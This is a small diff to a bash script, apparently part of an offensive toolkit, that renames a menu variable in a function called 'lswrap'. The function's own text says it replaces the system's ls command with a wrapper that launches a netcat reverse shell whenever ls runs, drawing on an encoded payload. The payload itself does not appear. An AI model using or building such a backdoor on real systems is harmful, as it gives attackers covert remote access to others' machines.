@@ -76,8 +76,8 @@ function lswrap(){
 		echo -e "--ls payload wrapper--\n"
 		echo -e "*****WARNING*****"
 		echo -e "This function wraps this systems ls command with a function that runs a netcat reverse shell when ls is run in terminal\n"
-		read -p "enter (continue/exit) or press enter to return to menu: " bs	
-		case $bs in
+		read -p "enter (continue/exit) or press enter to return to menu: " ce	
+		case $ce in
 			[CONTINUEcontinue]* )
 				shell=${payloads[0]}
 				encshell
